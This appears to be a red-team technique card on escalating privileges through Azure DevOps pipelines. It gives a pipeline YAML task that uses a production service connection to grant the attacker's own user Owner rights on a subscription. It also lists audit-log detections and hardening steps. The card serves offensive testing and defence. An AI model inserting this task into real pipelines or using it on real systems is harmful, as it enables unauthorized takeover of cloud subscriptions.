# [PE-ACCTMGMT-010]: Azure DevOps Pipeline Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-010 |
| **MITRE ATT&CK v18.1** | [Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Azure DevOps |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Azure DevOps (ADO) pipelines interact with Azure resources via **Service Connections**. These connections often use a Service Principal (SP) that is granted `Contributor` or `Owner` on the target subscription. A user with "Edit Build Pipeline" permissions (e.g., a developer) can modify the `azure-pipelines.yml` file to execute an Azure CLI task using this connection. They can then run commands to add their own user as an Owner or create a backdoor SP.
- **Attack Surface:** CI/CD Pipelines.
- **Business Impact:** **Dev-to-Prod Escalation**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Build Administrator / Pipeline Editor.
- **Tools:**
    - [ADOKit](https://github.com/xforcered/ADOKit)
    - Git

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Connections**
List available service connections in Project Settings.

**Step 2: Modify Pipeline**
Add a malicious task to `azure-pipelines.yml`.
```yaml
- task: AzureCLI@2
  inputs:
    azureSubscription: 'Production-Connection'
    scriptType: 'bash'
    scriptLocation: 'inlineScript'
    inlineScript: |
      az role assignment create --assignee <MyUserObjectID> --role "Owner" --scope "/subscriptions/..."
```

**Step 3: Commit & Push**
Trigger the build. The build agent executes the script using the Service Connection's credentials.

## 5. DETECTION (Blue Team Operations)

#### 5.1 ADO Audit Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Pipelines** | `Update Definition` | Changes to pipeline YAML files or settings. |
| **Azure Activity** | `Write RoleAssignment` | Role assignment performed by the DevOps Service Principal. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Approval Gates:** Require approval from a separate team (Environment Admin) before a pipeline can use a Production Service Connection.
*   **Scoping:** Scope Service Connections to specific Resource Groups, not the entire Subscription.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [PE-VALID-010]
